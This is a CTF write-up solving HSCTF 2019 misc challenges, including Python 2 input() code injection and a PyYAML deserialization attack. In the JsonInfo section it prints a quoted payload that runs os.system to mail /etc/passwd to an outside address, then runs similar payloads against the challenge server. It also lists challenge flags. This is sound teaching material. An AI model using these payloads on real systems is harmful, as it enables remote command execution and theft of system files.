A High School CTF event.

![score](assets/misc/score.PNG)

We tried to solve challenges as much as possible we can and as a reult we secured 23 position globally.

![image](assets/screencapture-ctf-hsctf-challenges-2019-06-08-12_20_54.png)

Challenge  Name | Points | Flag
------------ | ------------- | ---------------
 | |
 | |
 | |
 | |
 | |
 | |
 | |
 | |
 | |
 | |
 | |
 | |
 | |
 | |
 | |
 | |
 | |
 | |
 | |
 | |
 | |
 | |
 | |
 | |
 | |


So I will try to discuss the challenges i loved the most here:


# MISC

## A Simple Conversation-:
> description: 


<img src="assets/misc/simpleconversation.png" width="400px" height="450px" >


### Solution:
 
On looking to the section of source code we see

```python
print("What's your age?")

age = input("> ")

sleep(1)

```
Then I try to think that when it parses the input to input() then it tries to evaluate it first that is is it string , dictionary ,tuple or etc. So guessing the flag is on the server I try to send the arguments as yu can see.

```streaker@DESKTOP-DS7FIJL:$ nc misc.hsctf.com 9001
Hello!
Hey, can you help me out real quick.
I need to know your age.
What's your age?
> open("flag").read()
Traceback (most recent call last):
  File "talk.py", line 18, in <module>
    age = input("> ")
  File "<string>", line 1, in <module>
IOError: [Errno 2] No such file or directory: 'flag'
streaker@DESKTOP-DS7FIJL:$ nc misc.hsctf.com 9001
Hello!
Hey, can you help me out real quick.
I need to know your age.
What's your age?
> open("flag.txt").read()
Wow!
Sometimes I wish I was hsctf{plz_u5e_pyth0n_3}
...
```
There you can see the flag:`hsctf{plz_u5e_pyth0n_3}`

## Broken_Repl-:
> description: 


<img src="assets/misc/brokenrepl.png" width="450px" height="450px" >

 ### Solution:
 
```python
    try: # try to compile the input
                code = compile(line, "<input>", "exec") # compile the line of input
            except (OverflowError, SyntaxError, ValueError, TypeError, RecursionError) as e: # user input was bad
                print("there was an error in your code:", e) # notify the user of the error
            if False: exec(code) # run the code
            # TODO: find replacement for exec
            # TODO: exec is unsafe
except MemoryError: # we ran out of memory
    # uh oh
    # lets remove the flag to clear up some memory
    print(flag) # log the flag so it is not lost
```
You can see that you have to cause memoory error only. So my teammate Lucas looked on web and finds out [this](https://stackoverflow.com/questions/50709371/ast-literal-eval-memory-error-on-nested-list).
So you can see that we can cause memory error from nested list.Great learning :smiley:

```python
echo "[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]" | nc misc.hsctf.com 8550
>>> s_push: parser stack overflow
hsctf{dont_you_love_parsers}
```
There is the flag:`hsctf{dont_you_love_parsers}`
    
## Hidden Flag-:
> description: 


<img src="assets/misc/hiddenflag.png" width="450px" height="400px" >

 ### Solution:
 
 I opened up my hexeditor HXD a great tool to change and view the hexes of file quite easily and
 I see messed up bytes in beginning.
 
 <img src="assets/misc/hxd.png" width="550px" height="100px" >
 
 
 Then at the end of the file i see some text `key is invisible`.
 So then i realise that the bytees must be xored with the key and we got it by this [script](assets/misc/fixchall.py).
 
```python
import binascii
from itertools import cycle,izip

f=open("chall.png")
g=(f.read())
key="invisible"
ciphered = ''.join(chr(ord(c)^ord(k)) for c,k in izip(g, cycle(key)))
l=open("fixed.png","a+")
l.write(ciphered)

```
That's it :smiley:

<img src="assets/misc/fixed.png" width="550px" height="250px" >
 
## 64+Word -:
> description: 

<img src="assets/misc/64word.png" width="450px" height="400px" >

### Solution :
So from the description we see the word search and challenge name is 64+. So we need to do base64 word search of flag.
Be sure as the base64 encode texts are multiple of 4 . So chose the texts accordingly.Here is the [Script](/assets/misc/ord64.py)

```python
from  base64 import *
file=open("64word.txt")
data=file.read().split("\n")
o=0
while o<100:
    g=data[o:]
    for q in range(100):
        j=q
        s=""
        for i in g:
            if j>=len(i):
                break
            s+=i[j]
            j+=1
        possible_text=(b64decode(s[:4*(len(s)//4)]))
        if "hsctf{" in possible_text[:6]:
            end_ind=possible_text.find('}')+1
            print("The flag is "+ possible_text[:end_ind] )
            exit(0)
    o+=1

```

then there is the flag:`The flag is hsctf{b4s3_64_w0rd_s3arch3s_ar3_fu9?}`

## Broken gps-:
> description:
Input Format:
<img src="assets/misc/brokengps1.png" width="400px" height="600px" >

A challenge to test some coding skills.

### Solution:
Here's the [script](assets/misc/dir_gps.py) thats explain it all.

```python
import math

suffix=".txt"
flag=""
dirs=["east","west","south","north","northwest","northeast","southeast","southwest"]
for i in range(1,13):
    up=0
    right=0
    filename=str(i)+suffix
    f=open(filename)
    h=(f.read()).split()
    for q in range(int(h[0])):
        pos=dirs.index(h[q+1])
        if pos==0 or pos==5 or pos==6:
            right+=1
        if pos==1 or pos==4 or pos==7:
            right-=1
        if pos==3 or pos==4 or pos==5:
            up+=1
        if pos==2 or pos==6 or pos==7:
            up-=1
    flag+=chr(round(math.sqrt(up*up+right*right)*2)%26+97)
print('hsctf{'+flag+'}')
            
```
and here is the output:
>hsctf{garminesuckz}

## RealReversal-:
> description: 

<img src="assets/misc/realreversal.png" width="400px" height="400px" >

### Solution:
On opening file we see 

<img src="assets/misc/revd.png" width="850px" height="150px" >

Reversing the file means reversing the hexes.So one liner will do that 

```open("reversed_reversed.txt", "wb").write(open("reversed.txt", "rb").read()[::-1])```

and on opening reversed file you see utf-8 chars

<img src="assets/misc/utf8.png" width="900px" height="100px" >

Explanation:Why it happens that on the reverse bytes we can't see any characters, because 

>UTF-8 is a variable width character encoding capable of encoding all 1,112,064 valid code points in Unicode using one to four 8-bit bytes.

So on reversing 8 bytes it messed up as it reversed in two parts of four and four.Thus resulting in random chars.
So you can see the flag now:`hsctf{utf8_for_the_win}`

## JsonInfo-:
> description: 

<img src="assets/misc/jsoninfo.png" width="450px" height="550px" >

### Solution:
Trying few thing we see that it accepts string and show that it's json or give the error otherwise.
So We quite stuck on thinking that what kind of error we have to produce.Then googling skills had to come as it is misc, so we found a beautiful [link](https://bzdww.com/article/164589/) and in section 5 we see yaml.load
and here is the warning:

>Refer to the PyYAML documentation:

>Warning: It is not safe to call yaml.load with data received from an untrusted source! Yaml.load is just as powerful as pickle.load, so you can call any Python function.
In this beautiful example found in the popular Python project Ansible , you can provide this value as (valid) YAML to Ansible Vault, which calls os.system() with the parameters provided in the file.

>!!python/object/apply:os.system ["cat /etc/passwd | mail me@hack.c"]
Therefore, effectively loading YAML files from user-supplied values ​​will open the door for attacks.

>repair:

>Always use yaml.safe_load unless you have a very good reason.

So we tried to do these thing as instructed here to see if the vulnerability is here:

```
Welcome to JSON info!
Please enter your JSON:
!!python/object/apply:os.system ["cat /etc/passwd "]
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
syslog:x:101:102::/home/syslog:/usr/sbin/nologin
Type int is unsupported
Please use a valid JSON array or object
Thank you for using JSON info!

```
SO yeah the vulnerability is here, Great!!!

```
streaker@DESKTOP-DS7FIJL:$ nc -q 1 misc.hsctf.com 9999
Welcome to JSON info!
Please enter your JSON:
!!python/object/apply:os.system ["cat flag.txt"]
hsctf{JS0N_or_Y4ML}
Type int is unsupported
Please use a valid JSON array or object
Thank you for using JSON info!
```
The flag is:`hsctf{JS0N_or_Y4ML}`
